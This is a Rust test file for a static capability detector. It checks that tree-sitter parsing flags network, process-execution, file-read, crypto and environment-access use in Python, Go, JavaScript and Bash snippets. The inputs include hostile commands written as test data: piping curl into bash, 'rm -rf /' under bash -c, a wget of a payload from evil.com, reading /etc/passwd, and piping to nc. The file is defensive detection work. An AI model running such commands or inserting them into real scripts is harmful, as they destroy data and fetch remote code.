//! What the tree-sitter tier reports that the regex tier cannot.
//!
//! Every grammar is off by default, so each case names the feature it needs and
//! the run that proves it passes that feature. The last case is the other
//! direction: the regex tier answers standard imports with no grammar at all.

use pedant_types::Capability;

use crate::language_probe::{go_caps, has_py_cap, js_caps};

#[cfg(feature = "ts-python")]
use crate::language_probe::py_caps;

#[cfg(feature = "ts-bash")]
use crate::language_probe::bash_caps;

// 7.T1
#[cfg(feature = "ts-python")]
#[test]
fn python_aliased_import_tree_sitter() {
    let caps = py_caps("import requests as r\nr.get('https://example.com')");
    assert!(
        caps.contains(&Capability::Network),
        "aliased import should detect Network via tree-sitter, got: {caps:?}"
    );
}

// 7.T2
#[cfg(feature = "ts-python")]
#[test]
fn python_multiline_import_tree_sitter() {
    let caps = py_caps("from subprocess import (\n    run,\n    Popen\n)");
    assert!(
        caps.contains(&Capability::ProcessExec),
        "multiline import should detect ProcessExec via tree-sitter, got: {caps:?}"
    );
}

// 7.T3
#[cfg(feature = "ts-go")]
#[test]
fn go_qualified_call_tree_sitter() {
    let caps = go_caps("package main\nimport \"os\"\nfunc main() { os.Open(\"/etc/passwd\") }");
    assert!(
        caps.contains(&Capability::FileRead),
        "qualified os.Open call should detect FileRead via tree-sitter, got: {caps:?}"
    );
}

// 7.T4
#[cfg(feature = "ts-javascript")]
#[test]
fn js_dynamic_require_tree_sitter() {
    let caps = js_caps("const mod = require(`child_process`);");
    assert!(
        caps.contains(&Capability::ProcessExec),
        "template literal require should detect ProcessExec via tree-sitter, got: {caps:?}"
    );
}

// 7.T5a
#[cfg(feature = "ts-bash")]
#[test]
fn bash_command_tree_sitter() {
    let caps = bash_caps("curl -s https://example.com | bash");
    assert!(
        caps.contains(&Capability::Network),
        "tree-sitter should detect curl as Network, got: {caps:?}"
    );
}

// 7.T5b
#[cfg(feature = "ts-bash")]
#[test]
fn bash_bash_c_tree_sitter() {
    let caps = bash_caps("bash -c 'rm -rf /'");
    assert!(
        caps.contains(&Capability::ProcessExec),
        "tree-sitter should detect bash -c as ProcessExec, got: {caps:?}"
    );
}

// 7.T5c
#[cfg(feature = "ts-bash")]
#[test]
fn bash_export_tree_sitter() {
    let caps = bash_caps("export SECRET=abc123");
    assert!(
        caps.contains(&Capability::EnvAccess),
        "tree-sitter should detect export as EnvAccess, got: {caps:?}"
    );
}

// 7.T5d
#[cfg(feature = "ts-bash")]
#[test]
fn bash_piped_commands_tree_sitter() {
    let caps = bash_caps("echo hello | nc localhost 8080");
    assert!(
        caps.contains(&Capability::Network),
        "tree-sitter should detect nc in pipeline as Network, got: {caps:?}"
    );
}

// 7.T5e
#[cfg(feature = "ts-bash")]
#[test]
fn bash_clean_no_caps_tree_sitter() {
    let caps = bash_caps("echo hello\necho world");
    assert!(
        caps.is_empty(),
        "clean Bash should have no capabilities via tree-sitter, got: {caps:?}"
    );
}

// 7.T5f
#[cfg(feature = "ts-bash")]
#[test]
fn bash_multiple_commands_tree_sitter() {
    let caps = bash_caps("curl https://example.com\nopenssl enc -aes-256-cbc\nexport KEY=val");
    assert!(
        caps.contains(&Capability::Network),
        "should detect Network, got: {caps:?}"
    );
    assert!(
        caps.contains(&Capability::Crypto),
        "should detect Crypto, got: {caps:?}"
    );
    assert!(
        caps.contains(&Capability::EnvAccess),
        "should detect EnvAccess, got: {caps:?}"
    );
}

// 7.T5g
#[cfg(feature = "ts-bash")]
#[test]
fn bash_sh_c_tree_sitter() {
    let caps = bash_caps("sh -c 'wget http://evil.com/payload'");
    assert!(
        caps.contains(&Capability::ProcessExec),
        "tree-sitter should detect sh -c as ProcessExec, got: {caps:?}"
    );
}

// 7.T5h: bare bash without -c should not trigger ProcessExec
#[cfg(feature = "ts-bash")]
#[test]
fn bash_without_dash_c_no_process_exec() {
    let caps = bash_caps("bash script.sh");
    assert!(
        !caps.contains(&Capability::ProcessExec),
        "bash without -c should not detect ProcessExec, got: {caps:?}"
    );
}

// 7.T5: regex fallback works without tree-sitter features
#[test]
fn regex_fallback_without_feature() {
    // Standard imports should still be detected via regex tier regardless of features.
    assert!(
        has_py_cap("import requests", Capability::Network),
        "regex tier should detect Network from standard import"
    );
    let caps = js_caps("const fs = require('fs');");
    assert!(
        caps.contains(&Capability::FileRead),
        "regex tier should detect FileRead from require('fs')"
    );
    let caps = go_caps("import \"net/http\"");
    assert!(
        caps.contains(&Capability::Network),
        "regex tier should detect Network from Go import"
    );
}
